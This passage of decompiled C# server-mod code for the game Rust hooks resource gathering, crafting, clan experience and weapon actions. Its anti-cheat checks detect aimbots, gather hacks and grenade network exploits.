								DeathScreen.SetReason(player.netPlayer, playerControlledController.playerClient.userName + " 一击来杀到你的 " + BodyParts.GetNiceName(damage.bodyPart));
							}
						}
					}
					else
					{
						DeathScreen.SetReason(player.netPlayer, "你死亡了.凶手: " + Helper.NiceName(character.name));
					}
				}
			}
		}

		public static bool DropItem(Inventory inv, int slot, IInventoryItem inventoryItem)
		{
			string message = Config.GetMessage(inventoryItem.datablock.name, null, null);
			Notice.Inventory(inv.networkView.owner, "丢失" + inventoryItem.uses.ToString() + "个" + message);
			return true;
		}

		public static void DatablockDictionary_Initialize()
		{
			Main.Call("OnDatablocksLoaded", null);
			Override.Initialize();
		}

		public static void Resource_TryInitialize(ResourceTarget hook)
		{
			if (!hook._initialized)
			{
				object[] array = Main.Array(1);
				array[0] = hook;
				Main.Call("OnResourceNodeLoaded", array);
				foreach (ResourceGivePair current in hook.resourcesAvailable)
				{
					float num = 1f;
					switch (hook.type)
					{
					case ResourceTarget.ResourceTargetType.Animal:
						num = Core.ResourcesAmountMultiplierFlay;
						break;
					case ResourceTarget.ResourceTargetType.WoodPile:
						num = Core.ResourcesAmountMultiplierWood;
						break;
					case ResourceTarget.ResourceTargetType.Rock1:
						num = Core.ResourcesAmountMultiplierRock;
						break;
					case ResourceTarget.ResourceTargetType.Rock2:
						num = Core.ResourcesAmountMultiplierRock;
						break;
					case ResourceTarget.ResourceTargetType.Rock3:
						num = Core.ResourcesAmountMultiplierRock;
						break;
					}
					if (num == 0f)
					{
						num = 0.01f;
					}
					current.amountMin = (int)Math.Abs((float)current.amountMin * num);
					current.amountMax = (int)Math.Abs((float)current.amountMax * num);
					current.CalcAmount();
				}
			}
			hook._initialized = true;
		}

		public static bool Resource_DoGather(ResourceTarget obj, Inventory reciever, float efficiency)
		{
			bool flag;
			if (obj.resourcesAvailable.Count == 0)
			{
				Helper.LogError("OBJECT[" + obj + "]: Not have availabled resources, this require to remove?", true);
				Helper.LogError("OBJECT[" + obj + "]: Tell to developer of Rust Extended about this message.", true);
				flag = false;
			}
			else
			{
				float num = 1f;
				switch (obj.type)
				{
				case ResourceTarget.ResourceTargetType.Animal:
					num = Core.ResourcesGatherMultiplierFlay;
					break;
				case ResourceTarget.ResourceTargetType.WoodPile:
					num = Core.ResourcesGatherMultiplierWood;
					break;
				case ResourceTarget.ResourceTargetType.Rock1:
					num = Core.ResourcesGatherMultiplierRock;
					break;
				case ResourceTarget.ResourceTargetType.Rock2:
					num = Core.ResourcesGatherMultiplierRock;
					break;
				case ResourceTarget.ResourceTargetType.Rock3:
					num = Core.ResourcesGatherMultiplierRock;
					break;
				}
				if (num == 0f)
				{
					num = 0.01f;
				}
				ResourceGivePair resourceGivePair = obj.resourcesAvailable[UnityEngine.Random.Range(0, obj.resourcesAvailable.Count)];
				obj.gatherProgress += efficiency * obj.gatherEfficiencyMultiplier * num;
				int num2 = (int)Mathf.Abs(obj.gatherProgress);
                Magma.Hooks.PlayerGather(reciever, obj, resourceGivePair, ref num2);
				obj.gatherProgress = Mathf.Clamp(obj.gatherProgress, 0f, (float)num2);
				num2 = Mathf.Min(num2, resourceGivePair.AmountLeft());
				if (num2 > 0)
				{
					UserData userData = null;
					NetUser netUser = NetUser.Find(reciever.networkView.owner);
					int num3 = reciever.AddItemAmount(resourceGivePair.ResourceItemDataBlock, num2);
					if (num3 < num2)
					{
						if (netUser != null)
						{
							userData = Users.GetBySteamID(netUser.userID);
						}
						int num4 = 0;
						if (userData != null && userData.Clan != null)
						{
							if (obj.type == ResourceTarget.ResourceTargetType.WoodPile)
							{
								num4 = (int)((long)num2 * (long)((ulong)userData.Clan.Level.BonusGatheringWood) / 100L);
							}
							else if (obj.type == ResourceTarget.ResourceTargetType.Rock1)
							{
								num4 = (int)((long)num2 * (long)((ulong)userData.Clan.Level.BonusGatheringRock) / 100L);
							}
							else if (obj.type == ResourceTarget.ResourceTargetType.Rock2)
							{
								num4 = (int)((long)num2 * (long)((ulong)userData.Clan.Level.BonusGatheringRock) / 100L);
							}
							else if (obj.type == ResourceTarget.ResourceTargetType.Rock3)
							{
								num4 = (int)((long)num2 * (long)((ulong)userData.Clan.Level.BonusGatheringRock) / 100L);
							}
							else if (obj.type == ResourceTarget.ResourceTargetType.Animal)
							{
								num4 = (int)((long)num2 * (long)((ulong)userData.Clan.Level.BonusGatheringAnimal) / 100L);
							}
						}
						if (num4 > 0)
						{
							num4 -= reciever.AddItemAmount(resourceGivePair.ResourceItemDataBlock, num4);
						}
						int num5 = num2 - num3;
						resourceGivePair.Subtract(num5);
						obj.gatherProgress -= (float)num5;
						string message = Config.GetMessage(resourceGivePair.ResourceItemName, null, null);
						Notice.Inventory(reciever.networkView.owner, "获得" + (num5 + num4).ToString() + "个" + message);
						obj.SendMessage("ResourcesGathered", SendMessageOptions.DontRequireReceiver);
						if (userData != null && userData.Clan != null)
						{
							float num6 = 0f;
							if (resourceGivePair.ResourceItemName.Equals("Raw Chicken Breast", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)(num5 * 2);
							}
							else if (resourceGivePair.ResourceItemName.Equals("Animal Fat", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)num5;
							}
							else if (resourceGivePair.ResourceItemName.Equals("Blood", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)(num5 * 2);
							}
							else if (resourceGivePair.ResourceItemName.Equals("Cloth", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)num5;
							}
							else if (resourceGivePair.ResourceItemName.Equals("Leather", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)(num5 * 2);
							}
							else if (resourceGivePair.ResourceItemName.Equals("Wood", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)(num5 / 2);
							}
							else if (resourceGivePair.ResourceItemName.Equals("Stones", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)(num5 / 2);
							}
							else if (resourceGivePair.ResourceItemName.Equals("Metal Ore", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)(num5 * 2);
							}
							else if (resourceGivePair.ResourceItemName.Equals("Sulfur Ore", StringComparison.OrdinalIgnoreCase))
							{
								num6 = (float)(num5 * 2);
							}
							if (num6 >= 0f)
							{
								if (num6 >= 1f)
								{
									num6 = Math.Abs(num6 * Clans.ExperienceMultiplier);
									userData.Clan.Experience += (ulong)num6;
									if (userData.Clan.Members[userData].Has(ClanMemberFlags.expdetails))
									{
										Broadcast.Message(reciever.networkView.owner, Config.GetMessage("Clan.Experience.Gather", null, null).Replace("%EXPERIENCE%", num6.ToString("N0")).Replace("%RESOURCE_NAME%", resourceGivePair.ResourceItemName), null, 0f);
									}
								}
							}
						}
					}
					else
					{
						obj.gatherProgress = 0f;
						Notice.Popup(reciever.networkView.owner, "", "您的背包已满,不能再采集了.", 4f);
					}
				}
				if (!resourceGivePair.AnyLeft())
				{
					obj.resourcesAvailable.Remove(resourceGivePair);
				}
				if (obj.resourcesAvailable.Count == 0)
				{
					obj.SendMessage("ResourcesDepletedMsg", SendMessageOptions.DontRequireReceiver);
				}
				flag = true;
			}
			return flag;
		}

		public static void CraftingInventory_StartCrafting(CraftingInventory hook, BlueprintDataBlock blueprint, int amount, ulong startTime)
		{
			RustHook.Class47 @class = new RustHook.Class47();
			object[] array = Main.Array(4);
			array[0] = hook;
			array[1] = blueprint;
			array[2] = amount;
			array[3] = startTime;
			if (Main.Call("OnStartCrafting", array) == null)
			{
				PlayerInventory playerInventory = hook as PlayerInventory;
				if (!playerInventory.KnowsBP(blueprint))
				{
					Broadcast.Notice(playerInventory.networkView.owner, "✘", Config.GetMessage("Player.Crafting.Blueprint.NotKnown", null, null), 2.5f);
					blueprint = null;
				}
				NetUser netUser = NetUser.Find(hook.networkView.owner);
				if (netUser == null)
				{
					blueprint = null;
				}
				else
				{
					@class.userData_0 = Users.GetBySteamID(netUser.userID);
					if (@class.userData_0 == null)
					{
						blueprint = null;
					}
					else
					{
						if (@class.userData_0.Zone != null && @class.userData_0.Zone.NoCraft && !netUser.admin)
						{
							Broadcast.Notice(playerInventory.networkView.owner, "✘", Config.GetMessage("Player.Crafting.NotAvailable", null, null), 2.5f);
							blueprint = null;
						}
						LoadoutEntry loadoutEntry = Core.Loadout.Find(new Predicate<LoadoutEntry>(@class.method_0));
						if (@class.userData_0 != null && loadoutEntry != null && loadoutEntry.NoCrafting.Contains(blueprint))
						{
							Broadcast.Notice(playerInventory.networkView.owner, "✘", Config.GetMessage("Player.Crafting.Blueprint.NotAvailable", null, null), 2.5f);
							blueprint = null;
						}
						if (hook.crafting.Restart(hook, amount, blueprint, startTime))
						{
							hook._lastThinkTime = NetCull.time;
							if (crafting.timescale != 1f)
							{
								hook.crafting.duration = Math.Max(0.1f, hook.crafting.duration * crafting.timescale);
							}
							if (@class.userData_0.Clan != null && @class.userData_0.Clan.Level.BonusCraftingSpeed > 0u)
							{
								float num = hook.crafting.duration * @class.userData_0.Clan.Level.BonusCraftingSpeed / 100f;
								if (num > 0f)
								{
									hook.crafting.duration = Math.Max(0.1f, hook.crafting.duration - num);
								}
							}
							if (hook.IsInstant())
							{
								hook.crafting.duration = 0.1f;
							}
							hook.UpdateCraftingDataToOwner();
							hook.BeginCrafting();
						}
					}
				}
			}
		}

		public static bool BlueprintDataBlock_CompleteWork(BlueprintDataBlock BP, int amount, Inventory inventory)
		{
			bool flag;
			if (!BP.CanWork(amount, inventory))
			{
				flag = false;
			}
			else
			{
				int num = 0;
				for (int i = 0; i < BP.ingredients.Length; i++)
				{
					int num2 = BP.ingredients[i].amount * amount;
					if (num2 != 0)
					{
						int num3 = BP.lastCanWorkIngredientCount[i];
						for (int j = 0; j < num3; j++)
						{
							int slot = BP.lastCanWorkResult[num++];
							IInventoryItem inventoryItem;
							if (inventory.GetItem(slot, out inventoryItem) && inventoryItem.Consume(ref num2))
							{
								inventory.RemoveItem(slot);
							}
						}
					}
				}
				UserData userData = null;
				NetUser netUser = NetUser.Find(inventory.networkView.owner);
				if (netUser != null)
				{
					userData = Users.GetBySteamID(netUser.userID);
				}
				if (userData != null && userData.Clan != null)
				{
					float num4 = 0f;
					foreach (KeyValuePair<string, int> current in Clans.CraftExperience)
					{
						if (current.Key.Equals("Category." + BP.resultItem.category, StringComparison.OrdinalIgnoreCase))
						{
							num4 = (float)current.Value;
						}
						if (current.Key.Equals(BP.resultItem.name, StringComparison.OrdinalIgnoreCase))
						{
							num4 = (float)current.Value;
							break;
						}
					}
					num4 *= (float)amount;
					if (num4 < 0f)
					{
						num4 = 0f;
					}
					else if (num4 >= 1f)
					{
						num4 = Math.Abs(num4 * Clans.ExperienceMultiplier);
						userData.Clan.Experience += (ulong)num4;
						if (userData.Clan.Members[userData].Has(ClanMemberFlags.expdetails))
						{
							Broadcast.Message(inventory.networkView.owner, Config.GetMessage("Clan.Experience.Crafted", null, null).Replace("%EXPERIENCE%", num4.ToString("N0")).Replace("%ITEM_NAME%", BP.resultItem.name), null, 0f);
						}
					}
				}
				inventory.AddItemAmount(BP.resultItem, amount * BP.numResultItem);
				Notice.Inventory(inventory.networkView.owner, amount.ToString() + " x " + BP.resultItem.name);
				flag = true;
			}
			return flag;
		}

		public static void BloodDrawDatablock_UseItem(BloodDrawDatablock hook, IBloodDrawItem draw)
		{
			if (Time.time >= draw.lastUseTime + 2f)
			{
				Inventory inventory = draw.inventory;
				if (inventory.GetLocal<HumanBodyTakeDamage>().health <= hook.bloodToTake)
				{
					Notice.Popup(inventory.networkView.owner, "?", "你太虚弱了", 4f);
				}
				else
				{
					int slot = draw.slot;
					inventory.RemoveItem(slot);
					inventory.MarkSlotDirty(slot);
					Datablock.Ident ident = "Blood";
					IDMain idMain = inventory.idMain;
					TakeDamage.Hurt(idMain, idMain, hook.bloodToTake, null);
					inventory.AddItem(ref ident, Inventory.Slot.Preference.Define(Inventory.Slot.Kind.Default, true, Inventory.Slot.KindFlags.Belt), 25);
					draw.lastUseTime = Time.time;
					draw.FireClientSideItemEvent(InventoryItem.ItemEvent.Used);
				}
			}
		}

		public static void MeleeWeaponDataBlock_DoAction1(MeleeWeaponDataBlock hook, uLink.BitStream stream, ItemRepresentation rep, ref uLink.NetworkMessageInfo info)
		{
			GameObject gameObject = null;
			NetEntityID netEntityID;
			if (stream.ReadBoolean())
			{
				netEntityID = stream.Read<NetEntityID>(new object[0]);
			}
			else
			{
				netEntityID = NetEntityID.unassigned;
			}
			if (!netEntityID.isUnassigned)
			{
				gameObject = netEntityID.gameObject;
			}
			if (gameObject == null)
			{
				netEntityID = NetEntityID.unassigned;
			}
			Vector3 vector = stream.ReadVector3();
			bool flag = stream.ReadBoolean();
			IMeleeWeaponItem meleeWeaponItem;
			if (rep.Item<IMeleeWeaponItem>(out meleeWeaponItem))
			{
				Character character = meleeWeaponItem.inventory.idMain as Character;
				TakeDamage local = meleeWeaponItem.inventory.GetLocal<TakeDamage>();
				if (local != null && !local.dead && meleeWeaponItem.ValidatePrimaryMessageTime(info.timestamp))
				{
					IDBase iDBase = (gameObject != null) ? IDBase.Get(gameObject) : null;
					TakeDamage takeDamage = (iDBase != null) ? iDBase.GetLocal<TakeDamage>() : null;
					NetUser netUser = (!(character != null) || !character.controllable) ? null : character.netUser;
					if (netUser != null && flag && vector.Equals(Vector3.zero))
					{
						Truth.PunishDetails = Config.GetMessageTruth("Truth.Punish.Reason.ObjectHack.GatherStaticTree", netUser, "", 0, default(DateTime));
						Truth.PunishDetails = Truth.PunishDetails.Replace("%KILLER.NAME%", netUser.displayName);
						Truth.PunishDetails = Truth.PunishDetails.Replace("%KILLER.POS%", character.transform.position.AsString());
						Truth.PunishDetails = Truth.PunishDetails.Replace("%WEAPON%", meleeWeaponItem.datablock.name);
						Truth.PunishDetails = Truth.PunishDetails.Replace("%OBJECT.POS%", vector.AsString());
						Truth.Punish(netUser, Users.GetBySteamID(netUser.userID), Truth.HackMethod.OtherHack, false);
					}
					else
					{
						if (gameObject == null || Vector3.Distance(local.transform.position, gameObject.transform.position) < 6f)
						{
							Metabolism component = meleeWeaponItem.inventory.GetComponent<Metabolism>();
							if (component != null)
							{
								component.SubtractCalories(UnityEngine.Random.Range(hook.caloriesPerSwing * 0.8f, hook.caloriesPerSwing * 1.2f));
							}
							rep.ActionStream(1, uLink.RPCMode.AllExceptOwner, stream);
							ResourceTarget resourceTarget = (iDBase != null || gameObject != null) ? ((iDBase != null) ? iDBase.gameObject : gameObject).GetComponent<ResourceTarget>() : null;
							if (!flag && (!(resourceTarget != null) || (!(takeDamage == null) && !takeDamage.dead)))
							{
								if (iDBase != null)
								{
									Collider[] array = Physics.OverlapSphere(character.eyesRay.origin, 0.2f);
									for (int i = 0; i < array.Length; i++)
									{
										Collider collider = array[i];
										IDBase component2 = collider.gameObject.GetComponent<IDBase>();
										if (component2 != null && component2.idMain is StructureMaster)
										{
											return;
										}
									}
									if (iDBase.idMain.gameObject.GetComponent<PlayerClient>() != null)
									{
										Ray lookRay = Helper.GetLookRay(character);
										Vector3 position = iDBase.transform.position;
										position.y += 0.1f;
										if (Physics.RaycastAll(lookRay, Vector3.Distance(lookRay.origin, position), -1).Length > 1)
										{
											return;
										}
									}
									TakeDamage.Hurt(meleeWeaponItem.inventory, iDBase, new DamageTypeList(0f, 0f, hook.GetDamage(), 0f, 0f, 0f), new WeaponImpact(hook, meleeWeaponItem, rep));
								}
							}
							else
							{
								ResourceTarget.ResourceTargetType resourceTargetType = ResourceTarget.ResourceTargetType.StaticTree;
								if (!flag && resourceTarget != null)
								{
									resourceTargetType = resourceTarget.type;
								}
								float num = hook.efficiencies[(int)resourceTargetType];
								if (flag)
								{
									hook.resourceGatherLevel += num;
									if (hook.resourceGatherLevel >= 1f)
									{
										if (!RustHook.TreeGatherPoint.ContainsKey(netUser))
										{
											RustHook.TreeGatherPoint.Add(netUser, new RustHook.UserGatherPoint
											{
												position = Vector3.zero,
												quantity = 0u
											});
										}
										RustHook.UserGatherPoint value = RustHook.TreeGatherPoint[netUser];
										if (TransformHelpers.Dist2D(vector, value.position) > 2f)
										{
											RustHook.TreeGatherPoint[netUser] = new RustHook.UserGatherPoint
											{
												position = vector,
												quantity = 1u
											};
										}
										else
										{
											if (value.quantity >= 15u)
											{
												Notice.Popup(netUser.networkPlayer, "", "没有木材在这里留下", 2f);
												hook.resourceGatherLevel = 0f;
												return;
											}
											value.quantity += 1u;
											RustHook.TreeGatherPoint[netUser] = value;
										}
										string text = "Wood";
										int num2 = Mathf.FloorToInt(hook.resourceGatherLevel);
										ItemDataBlock byName = DatablockDictionary.GetByName(text);
										Magma.Hooks.PlayerGatherWood(meleeWeaponItem, resourceTarget, ref byName, ref num2, ref text);
										int num3;
										if (byName == null)
										{
											num3 = 0;
										}
										else
										{
											int num4 = meleeWeaponItem.inventory.AddItemAmount(byName, num2);
											num3 = num2 - num4;
										}
										if (num3 > 0)
										{
											hook.resourceGatherLevel -= (float)num3;
											Notice.Inventory(info.sender, num3.ToString() + " x " + text);
										}
									}
								}
								else if (resourceTarget != null && !float.IsNaN(num))
								{
									resourceTarget.DoGather(meleeWeaponItem.inventory, num);
								}
							}
						}
						if (gameObject != null && (netUser == null || !netUser.admin))
						{
							meleeWeaponItem.TryConditionLoss(0.25f, 0.025f);
						}
					}
				}
			}
		}

		public static void ShotgunDataBlock_DoAction1(ShotgunDataBlock hook, uLink.BitStream stream, ItemRepresentation rep, ref uLink.NetworkMessageInfo info)
		{
			IBulletWeaponItem bulletWeaponItem = null;
			if (rep.Item<IBulletWeaponItem>(out bulletWeaponItem) && bulletWeaponItem.uses > 0)
			{
				Character character = bulletWeaponItem.inventory.idMain as Character;
				TakeDamage local = bulletWeaponItem.inventory.GetLocal<TakeDamage>();
				if (character != null && local != null && !local.dead && bulletWeaponItem.ValidatePrimaryMessageTime(info.timestamp))
				{
					int num = 1;
					bulletWeaponItem.Consume(ref num);
					bulletWeaponItem.itemRepresentation.ActionStream(1, uLink.RPCMode.AllExceptOwner, stream);
					NetUser netUser = (!(character != null) || !character.controllable) ? null : character.netUser;
					UserData userData = (netUser != null) ? Users.GetBySteamID(netUser.userID) : null;
					if (netUser != null && userData != null && userData.HasUnlimitedAmmo)
					{
						int num2 = bulletWeaponItem.datablock._maxUses - bulletWeaponItem.uses;
						if (num2 > 0)
						{
							bulletWeaponItem.AddUses(num2);
						}
					}
					hook.GetBulletRange(rep);
					for (int i = 0; i < hook.numPellets; i++)
					{
						Vector3 zero = Vector3.zero;
						GameObject gameObject;
						bool flag;
						bool flag2;
						BodyPart bodyPart;
						IDRemoteBodyPart iDRemoteBodyPart;
						NetEntityID netEntityID;
						Transform transform;
						Vector3 vector;
						bool flag3;
						hook.ReadHitInfo(stream, out gameObject, out flag, out flag2, out bodyPart, out iDRemoteBodyPart, out netEntityID, out transform, out zero, out vector, out flag3);
						if (gameObject != null)
						{
							if (i == 0 && Truth.Test_WeaponShot(character, gameObject, bulletWeaponItem, rep, transform, zero, flag3))
							{
								return;
							}
							hook.ApplyDamage(gameObject, transform, flag3, zero, bodyPart, rep);
						}
					}
					if (character.netUser == null || !character.netUser.admin)
					{
						bulletWeaponItem.TryConditionLoss(0.33f, 0.01f);
					}
				}
			}
		}

		public static void BulletWeaponDataBlock_DoAction1(BulletWeaponDataBlock hook, uLink.BitStream stream, ItemRepresentation rep, ref uLink.NetworkMessageInfo info)
		{
			IBulletWeaponItem bulletWeaponItem;
			if (rep.Item<IBulletWeaponItem>(out bulletWeaponItem) && bulletWeaponItem.ValidatePrimaryMessageTime(info.timestamp) && bulletWeaponItem.uses > 0)
			{
				Character character = bulletWeaponItem.inventory.idMain as Character;
				TakeDamage local = bulletWeaponItem.inventory.GetLocal<TakeDamage>();
				if (character != null && local != null && !local.dead)
				{
					int num = 1;
					bulletWeaponItem.Consume(ref num);
					rep.ActionStream(1, uLink.RPCMode.AllExceptOwner, stream);
					GameObject gameObject;
					bool flag;
					bool flag2;
					BodyPart bodyPart;
					IDRemoteBodyPart iDRemoteBodyPart;
					NetEntityID netEntityID;
					Transform transform;
					Vector3 vector;
					Vector3 vector2;
					bool flag3;
					hook.ReadHitInfo(stream, out gameObject, out flag, out flag2, out bodyPart, out iDRemoteBodyPart, out netEntityID, out transform, out vector, out vector2, out flag3);
					NetUser netUser = (!(character != null) || !character.controllable) ? null : character.netUser;
					UserData userData = (netUser != null) ? Users.GetBySteamID(netUser.userID) : null;
					if (netUser != null && userData != null)
					{
						if (userData.HasUnlimitedAmmo)
						{
							int num2 = bulletWeaponItem.datablock._maxUses - bulletWeaponItem.uses;
							if (num2 > 0)
							{
								bulletWeaponItem.AddUses(num2);
							}
						}
						if (userData.CanTeleportShot)
						{
							Helper.GetLookObject(character.eyesRay, out vector, 3.40282347E+38f, -1);
							Helper.TeleportTo(netUser, vector);
							return;
						}
						if (!userData.HasShootObject.IsEmpty())
						{
							string[] array = Users.GetBySteamID(character.netUser.userID).HasShootObject.Replace(" ", "").Split(new char[]
							{
								','
							});
							string prefab = array[array.Length.Random(0)];
							GameObject gameObject2 = World.Spawn(prefab, vector);
							DeployableObject component = gameObject2.GetComponent<DeployableObject>();
							if (component != null)
							{
								component.SetupCreator(character.controllable);
							}
							LootableObject component2 = gameObject2.GetComponent<LootableObject>();
							if (component2 != null)
							{
								component2.lifeTime = 60f;
								component2.destroyOnEmpty = true;
							}
							TimedExplosive component3 = gameObject2.GetComponent<TimedExplosive>();
							if (component3 != null)
							{
								component3.CancelInvoke();
								component3.Invoke("Explode", 0f);
							}
							return;
						}
					}
					if (gameObject != null)
					{
						if (Truth.Test_WeaponShot(character, gameObject, bulletWeaponItem, rep, transform, vector, flag3))
						{
							return;
						}
						hook.ApplyDamage(gameObject, transform, flag3, vector, bodyPart, rep);
					}
					if (netUser == null || !netUser.admin)
					{
						bulletWeaponItem.TryConditionLoss(0.33f, 0.01f);
					}
					if (gunshots.aiscared)
					{
						local.GetComponent<Character>().AudibleMessage(20f, "HearDanger", local.transform.position);
						local.GetComponent<Character>().AudibleMessage(10f, "HearDanger", vector);
					}
				}
			}
		}

		public static void BowWeaponDataBlock_DoAction1(BowWeaponDataBlock hook, uLink.BitStream stream, ItemRepresentation rep, ref uLink.NetworkMessageInfo info)
		{
			IBowWeaponItem bowWeaponItem;
			Character character;
			if (rep.Item<IBowWeaponItem>(out bowWeaponItem) && bowWeaponItem.canPrimaryAttack && (character = bowWeaponItem.character) != null)
			{
				int num = 1;
				IInventoryItem inventoryItem = bowWeaponItem.FindAmmo();
				if (inventoryItem != null || character.netUser.admin)
				{
					bowWeaponItem.AddArrowInFlight();
					if (inventoryItem != null && inventoryItem.Consume(ref num))
					{
						bowWeaponItem.inventory.RemoveItem(inventoryItem.slot);
					}
					bowWeaponItem.nextPrimaryAttackTime = Time.time + hook.fireRate + hook.drawLength;
					rep.ActionStream(1, uLink.RPCMode.AllExceptOwner, stream);
					if (Truth.CheckAimbot && !character.netUser.admin)
					{
						bowWeaponItem.lastUseTime = Convert.ToSingle(Environment.TickCount);
						if (RustHook.HitRay.ContainsKey(character))
						{
							RustHook.HitRay.Remove(character);
						}
						RustHook.HitRay.Add(character, Helper.GetLookRay(character));
					}
				}
			}
		}

		public static void BowWeaponDataBlock_DoAction2(BowWeaponDataBlock hook, uLink.BitStream stream, ItemRepresentation rep, ref uLink.NetworkMessageInfo info)
		{
			IBowWeaponItem bowWeaponItem;
			Character character;
			if (rep.Item<IBowWeaponItem>(out bowWeaponItem) && (character = bowWeaponItem.character) != null)
			{
				NetEntityID netEntityID = stream.Read<NetEntityID>(new object[0]);
				Character character2;
				if ((character2 = (netEntityID.main as Character)) != null)
				{
					stream.ReadVector3();
					netEntityID.main.GetLocal<TakeDamage>();
					if (Truth.CheckAimbot && !character.netUser.admin)
					{
						bowWeaponItem.lastUseTime = Convert.ToSingle(Environment.TickCount) - bowWeaponItem.lastUseTime;
						string newValue = Helper.NiceName(character2.controllable ? character2.netUser.displayName : character2.name);
						if (bowWeaponItem.lastUseTime < 4000f && !RustHook.HitRay.ContainsKey(character))
						{
							Truth.PunishDetails = string.Concat(new object[]
							{
								character.transform.position,
								" use \"",
								bowWeaponItem.datablock.name,
								"\" with Silent Aim by Jacked Aimbot."
							});
							Truth.Punish(character.netUser, Users.GetBySteamID(character.netUser.userID), Truth.HackMethod.AimedHack, false);
							while (bowWeaponItem.AnyArrowInFlight())
							{
								bowWeaponItem.RemoveArrowInFlight();
							}
							return;
						}
						if (RustHook.HitRay.ContainsKey(character))
						{
							Vector3 position = character2.transform.position;
							position.y += 0.1f;
							float num = Vector3.Distance(RustHook.HitRay[character].origin, position);
							Vector3 vector;
							GameObject lookObject = Helper.GetLookObject(RustHook.HitRay[character], out vector, num, 406721553);
							RustHook.HitRay.Remove(character);
							if (lookObject != null && (lookObject.GetComponent<StructureComponent>() != null || lookObject.GetComponent<BasicDoor>() != null))
							{
								Truth.PunishDetails = Config.GetMessageTruth("Truth.Punish.Reason.Aimbot.ShootBlocked", character.netUser, "", 0, default(DateTime));
								Truth.PunishDetails = Truth.PunishDetails.Replace("%KILLER.NAME%", character.netUser.displayName);
								Truth.PunishDetails = Truth.PunishDetails.Replace("%VICTIM.NAME%", newValue);
								Truth.PunishDetails = Truth.PunishDetails.Replace("%KILLER.POS%", character.transform.position.AsString());
								Truth.PunishDetails = Truth.PunishDetails.Replace("%VICTIM.POS%", character2.transform.position.AsString());
								Truth.PunishDetails = Truth.PunishDetails.Replace("%OBJECT%", Helper.NiceName(lookObject.name));
								Truth.PunishDetails = Truth.PunishDetails.Replace("%OBJECT.NAME%", Helper.NiceName(lookObject.name));
								Truth.PunishDetails = Truth.PunishDetails.Replace("%OBJECT.POS%", lookObject.transform.position.AsString());
								Truth.PunishDetails = Truth.PunishDetails.Replace("%POINT%", vector.AsString());
								Truth.PunishDetails = Truth.PunishDetails.Replace("%DISTANCE%", Math.Abs(num).ToString("N1"));
								Truth.PunishDetails = Truth.PunishDetails.Replace("%WEAPON.RANGE%", "1000");
								Truth.PunishDetails = Truth.PunishDetails.Replace("%WEAPON%", bowWeaponItem.datablock.name);
								Truth.Punish(character.netUser, Users.GetBySteamID(character.netUser.userID), Truth.HackMethod.AimedHack, false);
								while (bowWeaponItem.AnyArrowInFlight())
								{
									bowWeaponItem.RemoveArrowInFlight();
								}
								return;
							}
						}
					}
					if (bowWeaponItem.AnyArrowInFlight())
					{
						TakeDamage.Hurt(bowWeaponItem.inventory.idMain, netEntityID.main, new DamageTypeList(0f, 0f, 75f, 0f, 0f, 0f), null);
					}
					while (bowWeaponItem.AnyArrowInFlight())
					{
						bowWeaponItem.RemoveArrowInFlight();
					}
				}
			}
		}

		public static void HandGrenadeDataBlock_DoAction1(HandGrenadeDataBlock hook, uLink.BitStream stream, ItemRepresentation rep, ref uLink.NetworkMessageInfo info)
		{
			IHandGrenadeItem handGrenadeItem;
			if (rep.Item<IHandGrenadeItem>(out handGrenadeItem) && handGrenadeItem.ValidatePrimaryMessageTime(info.timestamp))
			{
				Character character = handGrenadeItem.inventory.idMain as Character;
				if (!(character == null) && character.netUser != null && character.netUser.connected)
				{
					Vector3 vector = stream.ReadVector3();
					Vector3 vector2 = stream.ReadVector3();
					if (vector.Invalid() || vector2.Invalid() || vector.x > 8000f || vector.x < -8000f || vector.y > 2000f || vector.y < -2000f || vector.z > 8000f || vector.z < -8000f)
					{
						Truth.PunishDetails = Config.GetMessageTruth("Truth.Punish.Reason.NetExploit.Grenade", null, "", 0, default(DateTime));
						Truth.PunishDetails = Truth.PunishDetails.Replace("%WEAPON%", handGrenadeItem.datablock.name);
						Truth.PunishDetails = Truth.PunishDetails.Replace("%KILLER.NAME%", character.netUser.displayName);
						Truth.Punish(character.netUser, Users.GetBySteamID(character.netUser.userID), Truth.HackMethod.NetExploit, true);
					}
					else
					{
						rep.ActionStream(1, uLink.RPCMode.AllExceptOwner, stream);
						GameObject gameObject = hook.ThrowItem(rep, vector, vector2);
						if (gameObject != null)
						{
							gameObject.rigidbody.AddTorque(new Vector3(UnityEngine.Random.Range(-1f, 1f), UnityEngine.Random.Range(-1f, 1f), UnityEngine.Random.Range(-1f, 1f)) * 10f);
						}
						int num = 1;
						if (handGrenadeItem.Consume(ref num))
						{
							handGrenadeItem.inventory.RemoveItem(handGrenadeItem.slot);
						}
					}
				}
			}
		}

		public static void RigidObj_DoNetwork(RigidObj hook)
		{
			if (hook.networkViewID == uLink.NetworkViewID.unassigned)
			{
				NetCull.Destroy(hook.rigidbody.gameObject);
			}
			else
			{
				hook.networkView.RPC("RecieveNetwork", uLink.RPCMode.AllExceptOwner, new object[]
				{
					hook.rigidbody.position,
					hook.rigidbody.rotation
				});
				hook.serverLastUpdateTimestamp = NetCull.time;
			}
		}

		public static void Metabolism_DoNetworkUpdate(Metabolism hook)
		{
			if (hook.IsDirty())
			{
				hook.networkView.RPC("RecieveNetwork", hook.networkView.owner, new object[]
				{
					hook.caloricLevel,
					hook.waterLevelLitre,
					hook.radiationLevel,
					hook.antiRads,
					hook.coreTemperature,
					hook.poisonLevel
				});
			}
			hook.MakeClean();
		}

		public static void BasicWildLifeAI_DoNetwork(BasicWildLifeAI hook, WildlifeManager.LocalData localData)
		{
		}

		public static bool BasicWildLifeAI_ManagedUpdate(BasicWildLifeAI hook, ulong millis, WildlifeManager.LocalData localData)
		{
			return true;
		}

		private static bool smethod_1(EndPoint endPoint_0, out NetUser netUser_0)
		{
			uLink.NetworkPlayer[] connections = NetCull.connections;
			bool flag;
			for (int i = 0; i < connections.Length; i++)
			{
				uLink.NetworkPlayer networkPlayer = connections[i];
				if (networkPlayer.isClient && networkPlayer.isConnected && networkPlayer.endpoint.Equals(endPoint_0))
				{
					netUser_0 = NetUser.Find(networkPlayer);
					flag = true;
					return flag;
				}
			}
			netUser_0 = null;
